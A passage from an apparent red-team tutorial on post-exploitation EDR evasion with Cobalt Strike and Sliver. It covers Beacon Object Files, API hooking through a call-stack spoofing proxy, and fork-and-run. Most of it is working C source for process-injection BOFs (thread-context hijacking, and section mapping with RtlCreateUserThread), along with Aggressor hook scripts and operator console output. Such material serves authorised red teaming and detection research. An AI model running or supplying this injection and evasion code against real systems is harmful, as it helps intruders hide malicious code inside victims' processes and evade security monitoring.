        /* try to bypass it at NtContinue */
        if ( bypass_cfg ( NTDLL$NtContinue ) ) {
            enabled = FALSE;
        }
    }

    /*
     * just return if we
     * failed to bypass it
     */

    if ( enabled ) {
        return;
    }

    /*
     * crack on and setup a timer
     * to free the memory regions
     */
    ...
}

5. Post-Exploitation Evasion

What is post-exploitation evasion? Getting Beacon into memory (load-time) and keeping it hidden while sleeping (runtime) are just the first two battles. The third is what happens when you actually do things — dump credentials, enumerate the domain, inject into other processes. Each post-exploitation action has its own detection surface. An EDR that missed Beacon's initial load can still catch it when it runs Mimikatz, injects shellcode into another process, or spawns a child process to execute a tool.

Beacon is now resident in memory with load-time and runtime evasion in place. Post-exploitation introduces a new attack surface: every command that runs an external capability has its own footprint to manage. Most Beacon commands fall into one of three categories:

  • Beacon Object File (BOF) — inline execution inside the Beacon process.
  • Reflective DLL (spawn variant) — new process, remote injection.
  • Reflective DLL (explicit variant) — remote injection into an existing process.

Cobalt Strike ships three kits to customize this surface:

KitPurpose
postex kitWrite custom post-ex DLLs (Visual Studio solution)
process-inject kitCustom process injection techniques as BOFs
udrl-vs postex loaderReflective loader for post-ex DLLs

We'll stick with Crystal Palace for the loader work and the kits for the injection and post-ex sides.

5.1 Beacon Object Files

A Beacon Object File (BOF) is a C/C++ program compiled to a COFF without linking. Beacon acts as the linker at runtime, resolving function pointers to Win32 and internal BOF APIs. BOFs run inline inside Beacon's main thread, which makes them cheap (no injection, small payload) but constrained:

ProsCons
No remote injection — runs in current processCrashing BOF crashes Beacon
Small file size, suitable for low-bandwidth C2No standard library (no memset/memcpy/strlen)
OPSEC-safe load (no WriteProcessMemory/CreateThread)Blocks Beacon while running

BOFs are ideal for short, one-shot tasks. The clipboard, elevate, getsystem, jump, reg, remote-exec, and runasadmin commands all use BOFs internally.

Sliver equivalent: Sliver has native BOF support — same COFF format, similar inline-execution model. Use execute-bof directly, or install BOFs from the armory:

# List installable BOFs
sliver > armory list

# Install the inline-execute-pe family (BOF runner + helpers)
sliver > armory install inline-execute-pe

# Run a BOF in-session
sliver (SESSION) > execute-bof /path/to/whoami.x64.o

# Run with arguments (z = null-terminated string, i = int, s = short, b = binary)
sliver (SESSION) > execute-bof /path/to/ldapsearch.x64.o -p z:contoso.com -p z:DA

Sliver BOFs follow the same Beacon API surface (BeaconPrintf, BeaconDataParse, etc.) so most CS BOFs work as-is. Allocation behaviour is fixed inside the implant — there's no process-inject-style toggle for bof_allocator/startrwx.

Memory allocation for BOFs is controlled by the process-inject block in Malleable C2 (since we're using Crystal Palace, not a UDRL):

OptionValuesEffect
bof_allocatorVirtualAlloc / MapViewOfFile / HeapAllocHow the BOF memory is allocated
startrwxtrue / falseInitial permissions: true=RWX, false=RW
userwxtrue / falseExecution permissions: true=RWX, false=RX
bof_reuse_memorytrue / falsetrue=zero and reuse; false=free and reallocate per BOF

5.2 BOF evasion

BOFs don't perform "injection" in the classic sense — their content is written into memory and the go entry point is called. There's no WriteProcessMemory, no CreateThread, no SetThreadContext. But a BOF will still give itself away through whatever APIs it uses at runtime.

Beacon's BOF loader calls LoadLibraryA and GetProcAddress to resolve a BOF's external dependencies before transferring control. For example, TrustedSec's ldapsearch BOF imports WLDAP32$ldap_init and WLDAP32$ldap_bind_s — so Beacon loads wldap32.dll and resolves each function before the BOF runs. EDRs flag library loads from unbacked memory, so hooking LoadLibraryA through the PICO catches those events.

For cases where the BOF's own API calls need spoofing, hook GetProcAddress too — that extends the __resolve_hook intrinsic to the BOF and lets us redirect specific BOF APIs through our evasion tradecraft. The base set of hooks for a BOF-friendly PICO:

addhook "WININET$InternetOpenA"  "_InternetOpenA"
addhook "KERNEL32$ExitThread"    "_ExitThread"
addhook "KERNEL32$LoadLibraryA"  "_LoadLibraryA"
addhook "KERNEL32$Sleep"         "_Sleep"
addhook "KERNEL32$VirtualAlloc"  "_VirtualAlloc"

To redirect a specific BOF API like ldap_bind_s through the spoofing proxy, add GetProcAddress and the target API to the hook list:

addhook "WININET$InternetOpenA"   "_InternetOpenA"
addhook "KERNEL32$ExitThread"     "_ExitThread"
addhook "KERNEL32$GetProcAddress" "_GetProcAddress"
addhook "KERNEL32$LoadLibraryA"   "_LoadLibraryA"
addhook "KERNEL32$Sleep"          "_Sleep"
addhook "KERNEL32$VirtualAlloc"   "_VirtualAlloc"
addhook "WLDAP32$ldap_bind_s"     "_ldap_bind_s"

And implement the hook the same way as the others — pack args, push through spoof_call:

#include <windows.h>
#include <winldap.h>
#include "spoof.h"

DECLSPEC_IMPORT ULONG LDAPAPI WLDAP32$ldap_bind_s ( LDAP *, const PSTR, const PCHAR, ULONG );

ULONG LDAPAPI _ldap_bind_s ( LDAP * ld, const PSTR dn, const PCHAR cred, ULONG method )
{
    FUNCTION_CALL call = { 0 };

    call.ptr        = ( PVOID ) ( WLDAP32$ldap_bind_s );
    call.argc       = 4;
    call.args [ 0 ] = spoof_arg ( ld );
    call.args [ 1 ] = spoof_arg ( dn );
    call.args [ 2 ] = spoof_arg ( cred );
    call.args [ 3 ] = spoof_arg ( method );

    return ( ULONG ) spoof_call ( &call );
}

5.3 Fork & Run

Fork & run is the most OPSEC-expensive Beacon pattern. The spawn variant performs the following steps:

  1. Spawn a temporary process.
  2. Remote-inject the postex capability (VirtualAllocEx, WriteProcessMemory, etc.).
  3. The postex capability is a reflective DLL with its own loader, which settles the DLL into memory and calls the entry point. It may also disable AMSI/ETW.
  4. The postex DLL creates a named pipe and Beacon connects to it.
  5. The postex DLL runs and pipes output back to Beacon.
  6. The postex DLL calls ExitProcess to terminate the spawned process.

The explicit variant is the same flow with two differences: it targets an existing process instead of spawning a new one, and it calls ExitThread instead of ExitProcess on cleanup.

Every step in this chain is a detection opportunity — process spawn, remote injection, the postex loader, and the postex DLL's actions. Customizing all of it across the CS kits hits three limitations:

LimitationImpact
BeaconGate doesn't support CreateProcessA/CreateProcessAsUserANo CS-native way to apply evasion to the process spawn
Missing BOF APIs: BeaconSuspendThread, BeaconMapViewOfFile, BeaconCreateRemoteThread, BeaconQueueUserAPCHard to write novel injection BOFs without duplicating syscall/spoofing code
Sleepmask and BeaconGate don't cover postex DLLsPer-DLL implementation of every evasion technique — not viable for built-ins like powerpick

Crystal Palace solves this by applying evasion tradecraft to the capability itself. The loader and PICO we built for Beacon can be reused almost wholesale for postex DLLs.

Sliver equivalent: Sliver's fork-and-run analogues are simpler — spawning a new process or injecting into one is exposed directly as commands. There's no separate postex-loader contract; each command implements its own injection path inside the implant:

Sliver commandCS analogueBehaviour
execute-assemblyexecute-assembly / powerpickRuns a .NET assembly in a sacrificial process (spawn or in-process with --in-process)
sideloaddllinject / dllspawnLoads a reflective DLL into a target process
spawndlldllspawnSpawns a sacrificial process and loads a reflective DLL into it
migrateinjectMigrates the implant into a target PID
execute-shellcodeshinject / shspawnInjects raw shellcode (with --rwx, --ppid, etc.)

The --in-process flag on execute-assembly avoids the sacrificial spawn entirely (no CreateProcessA event), at the cost of host-process stability. Sleeve-mask / call-stack tradecraft for the spawned helper has to come from BOFs or a forked implant — there's no postex-kit hook to wedge it into.

5.4 Process Inject Kit

The process-inject block in Malleable C2 controls how Beacon allocates memory and dispatches execution for remote injection, but only offers a limited set of choices. The process inject kit lets operators write novel injection techniques as BOFs. It exposes two hooks:

HookPurpose
PROCESS_INJECT_SPAWNBOF spawns a process and injects the postex capability into it
PROCESS_INJECT_EXPLICITBOF injects the postex capability into a target PID

Because these are BOFs, you can build them from scratch, from bof-vs, or from a custom template. Any API call inside the BOF that's also detoured by the PICO automatically picks up the spoofing tradecraft.

5.5 PROCESS_INJECT_SPAWN

The spawn BOF receives two packed arguments:

  1. A boolean for BeaconSpawnTemporaryProcess — whether to use the currently impersonated token (from make_token/steal_token).
  2. The memory-injectable postex DLL bytes.

A basic implementation using Beacon's exposed APIs (BeaconSpawnTemporaryProcess, BeaconVirtualAllocEx, BeaconWriteProcessMemory, BeaconSetThreadContext, BeaconResumeThread):

#include <windows.h>
#include "beacon.h"

/* is this an x64 BOF */
BOOL is_x64 ( ) {
#if defined _M_X64
   return TRUE;
#elif defined _M_IX86
   return FALSE;
#endif
}

void go ( char * args, int alen, BOOL x86 )
{
   STARTUPINFOA        si;
   PROCESS_INFORMATION pi;
   datap               parser;
   short               ignoreToken;
   char *              dllPtr;
   int                 dllLen;
   LPVOID              baseAddress;
 
   /* warn about cross-arch injection */
   if ( ! is_x64 ( ) && x86 == FALSE ) {
      BeaconPrintf ( CALLBACK_ERROR, "Warning: inject from x86 -> x64" );
   }
   if ( is_x64 ( ) && x86 == TRUE ) {
      BeaconPrintf ( CALLBACK_ERROR, "Warning: inject from x64 -> x86" );
   }
 
   /* extract the arguments */
   BeaconDataParse ( &parser, args, alen );

   ignoreToken = BeaconDataShort ( &parser );
   dllPtr      = BeaconDataExtract ( &parser, &dllLen );
 
   /* zero out these data structures */
   __stosb ( ( void * ) &si, 0, sizeof ( STARTUPINFO ) );
   __stosb ( ( void * ) &pi, 0, sizeof ( PROCESS_INFORMATION ) );
 
   /* setup the other values in our startup info structure */
   si.dwFlags     = STARTF_USESHOWWINDOW;
   si.wShowWindow = SW_HIDE;
   si.cb          = sizeof ( si );
 
   /* let Beacon spawn the process, it will be suspended */
   if ( ! BeaconSpawnTemporaryProcess ( x86, ignoreToken, &si, &pi ) ) {
      BeaconPrintf ( CALLBACK_ERROR, "Unable to spawn %s temporary process.", x86 ? "x86" : "x64" );
      return;
   }

   /* allocate some memory */
   baseAddress = BeaconVirtualAllocEx ( pi.hProcess, NULL, dllLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

   /* write shellcode */
   SIZE_T bytesWritten = 0;
   BeaconWriteProcessMemory ( pi.hProcess, baseAddress, dllPtr, dllLen, &bytesWritten );

   /* flip permissions */
   DWORD oldProtect = 0;
   BeaconVirtualProtectEx ( pi.hProcess, baseAddress, dllLen, PAGE_EXECUTE_READ, &oldProtect );

   /* hijack main thread */
   CONTEXT ctx;
   __stosb ( (void * ) &ctx, 0, sizeof ( CONTEXT ) );

   ctx.ContextFlags = CONTEXT_CONTROL;
   BeaconGetThreadContext ( pi.hThread, &ctx );

#if defined _M_X64
   ctx.Rip = ( DWORD64 ) ( baseAddress );
#elif defined _M_IX86
   ctx.Eip = ( DWORD ) ( baseAddress );
#endif

   BeaconSetThreadContext ( pi.hThread, &ctx );
  
   /* resume main thread */
   BeaconResumeThread ( pi.hThread );

   /* let beacon close the handles */
   BeaconCleanupProcess ( &pi );
}
 
void gox86 ( char * args, int alen ) {
   go ( args, alen, TRUE );
}
 
void gox64 ( char * args, int alen ) {
   go ( args, alen, FALSE );
}

The Aggressor side of the hook reads the BOF, packs the arguments (boolean + DLL bytes), and dispatches via beacon_inline_execute:

set PROCESS_INJECT_SPAWN
{
    local ( '$barch $path $handle $data $args $entry' );
 
    $barch  = barch ( $1 );
    $path   = getFileProper ( script_resource ( ), "process_inject_spawn $+ . $+ $barch $+ .o" );
    $handle = openf ( $path );
    $data   = readb ( $handle, -1 );
    
    closef ( $handle );

    # pack our arguments
    $args = bof_pack ( $1, "sb", $3, $2 );
 
    # announce the injection
    btask ( $1, "Process Inject using fork and run." );
 
    # set the entry point
    $entry = "go $+ $4";
   
    # execute the BOF
    beacon_inline_execute ( $1, $data, $entry, $args );
 
    # let the caller know the hook was implemented.
    return 1;
}

Test with powerpick:

beacon> powerpick $pid
[*] Process Inject using fork and run.
[*] Tasked beacon to run: $pid (unmanaged)
[+] host called home, sent: 139194 bytes
[+] job registered with id 1
[+] [job 1] received output:
35148

[+] job 1 completed

5.6 PROCESS_INJECT_EXPLICIT

The explicit BOF receives three packed arguments:

  1. The target PID to inject into.
  2. An offset for BeaconInjectProcess — where execution should start.
  3. The memory-injectable postex DLL bytes.

The following implementation uses NtCreateSection/NtMapViewOfSection/RtlCreateUserThread directly, bypassing the higher-level Win32 APIs:

#include <windows.h>
#include "beacon.h"

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    PVOID UniqueProcess;
    PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$IsWow64Process    ( HANDLE, PBOOL );
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA  ( LPCSTR );
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress    ( HMODULE, LPCSTR );
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess ( VOID );
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess       ( DWORD, WINBOOL, DWORD );
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError      ( VOID );
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CloseHandle       ( HANDLE );

DECLSPEC_IMPORT void * WINAPIV MSVCRT$memcpy ( void*, const void*, SIZE_T );

typedef LONG NTAPI ( * NTCREATESECTION )      ( PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE );
typedef LONG NTAPI ( * NTMAPVIEWOFSECTION )   ( HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG );
typedef LONG NTAPI ( * NTUNMAPVIEWOFSECTION ) ( HANDLE, PVOID );
typedef LONG NTAPI ( * RTLCREATEUSERTHREAD )  ( HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PVOID, PVOID, PHANDLE, PCLIENT_ID );
typedef LONG NTAPI ( * NTCLOSE )              ( HANDLE );

/* is this an x64 BOF */
BOOL is_x64 ( ) {
#if defined _M_X64
    return TRUE;
#elif defined _M_IX86
    return FALSE;
#endif
}
 
/* is this a 64-bit or 32-bit process? */
BOOL is_wow64 ( HANDLE process ) {
    BOOL bIsWow64 = FALSE;
    if ( ! KERNEL32$IsWow64Process ( process, &bIsWow64 ) ) {
       return FALSE;
    }
    return bIsWow64;
}
 
/* check if a process is x64 or not */
BOOL is_x64_process ( HANDLE process ) {
    if ( is_x64 ( ) || is_wow64 ( KERNEL32$GetCurrentProcess ( ) ) ) {
       return ! is_wow64 ( process );
    }
    return FALSE;
}
 
/* See gox86 and gox64 entry points */
void go ( char * args, int alen, BOOL x86 )
{
    datap   parser;
    int     pid;
    int     offset;
    char  * dllPtr;
    int     dllLen;

    HMODULE              hNtdll;
    NTCREATESECTION      ntCreateSection;
    NTMAPVIEWOFSECTION   ntMapViewOfSection;
    NTUNMAPVIEWOFSECTION ntUnmapViewOfSection;
    RTLCREATEUSERTHREAD  rtlCreateUserThread;
    NTCLOSE              ntClose;

    HANDLE hProcess   = NULL;
    HANDLE hThread    = NULL;
    HANDLE hSection   = NULL;
    PVOID  hLocalMap  = NULL;
    PVOID  hRemoteMap = NULL;

    /* extract the arguments */
    BeaconDataParse ( &parser, args, alen );

    pid    = BeaconDataInt ( &parser );
    offset = BeaconDataInt ( &parser );
    dllPtr = BeaconDataExtract ( &parser, &dllLen );

    /* resolve the Nt functions that we need */
    hNtdll               = KERNEL32$GetModuleHandleA ( "NTDLL" );

    ntCreateSection      = ( NTCREATESECTION ) KERNEL32$GetProcAddress ( hNtdll, "NtCreateSection" );
    ntMapViewOfSection   = ( NTMAPVIEWOFSECTION ) KERNEL32$GetProcAddress ( hNtdll, "NtMapViewOfSection" );
    ntUnmapViewOfSection = ( NTUNMAPVIEWOFSECTION ) KERNEL32$GetProcAddress ( hNtdll, "NtUnmapViewOfSection" );
    rtlCreateUserThread  = ( RTLCREATEUSERTHREAD ) KERNEL32$GetProcAddress ( hNtdll, "RtlCreateUserThread" );
    ntClose              = ( NTCLOSE ) KERNEL32$GetProcAddress ( hNtdll, "NtClose" );
 
    /* open handle to the target process */
    hProcess = KERNEL32$OpenProcess ( PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid );

    if ( hProcess == INVALID_HANDLE_VALUE || hProcess == 0 ) {
       BeaconPrintf ( CALLBACK_ERROR, "Unable to open process %d : %d", pid, KERNEL32$GetLastError ( ) );
       return;
    }
 
    /* Check that we can inject the content into the process. */
    if ( ! is_x64_process ( hProcess ) && x86 == FALSE ) {
       BeaconPrintf ( CALLBACK_ERROR, "%d is an x86 process (can't inject x64 content)", pid );
       return;
    }
    if ( is_x64_process ( hProcess ) && x86 == TRUE ) {
       BeaconPrintf ( CALLBACK_ERROR, "%d is an x64 process (can't inject x86 content)", pid );
       return;
    }

    /* create a section with our local process */
    LARGE_INTEGER szSection = { dllLen };
    ntCreateSection ( &hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &szSection, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL );

    /* create a RW view of the section in the local process */
    SIZE_T size = dllLen;
    ntMapViewOfSection ( hSection, ( HANDLE ) ( -1 ), &hLocalMap, 0, 0, NULL, &size, 2, 0, PAGE_READWRITE );

    /* map that view into the target process as RX */
    ntMapViewOfSection ( hSection, hProcess, &hRemoteMap, 0, 0, NULL, &size, 2, 0, PAGE_EXECUTE_READ );

    /* copy shellcode into local memory */
    MSVCRT$memcpy ( hLocalMap, dllPtr, dllLen );

    /* execute the shellcode */
    rtlCreateUserThread ( hProcess, NULL, FALSE, 0, 0, 0, hRemoteMap, NULL, &hThread, NULL );
 
    /* clean up */
    KERNEL32$CloseHandle ( hThread );
    KERNEL32$CloseHandle ( hProcess );
    
    ntUnmapViewOfSection ( ( HANDLE ) ( -1 ), hLocalMap );
    ntClose ( hSection );
}
 
void gox86 ( char * args, int alen ) {
    go ( args, alen, TRUE );
}
 
void gox64 ( char * args, int alen ) {
    go ( args, alen, FALSE );
}

The Aggressor side mirrors the spawn hook — pack PID, offset, and DLL bytes; dispatch via beacon_inline_execute:

set PROCESS_INJECT_EXPLICIT
{
    local ( '$barch $path $handle $data $args $entry' );

    $barch = barch($1);
 
    # read the BOF
    $path   = getFileProper ( script_resource ( ), "process_inject_explicit $+ . $+ $barch $+ .o" );
    $handle = openf ( $path );
    $data   = readb ( $handle, -1 );
    
    closef ( $handle );
 
    # pack arguments
    $args = bof_pack ( $1, "iib", $3, $4, $2 );
 
    # announce the injection
    btask ( $1, "Process Inject using explicit injection into pid $3" );
 
    # set the entry point
    $entry = "go $+ $5";
    
    # execute the BOF
    beacon_inline_execute ( $1, $data, $entry, $args );
 
    # let the caller know the hook was implemented.
    return 1;
}

Test with psinject:

beacon> psinject 44172 x64 $pid
[*] Process Inject using explicit injection into pid 44172
[*] Tasked beacon to psinject: $pid into 44172 (x64)
[+] host called home, sent: 159279 bytes
[+] job registered with id 1
[+] [job 1] received output:
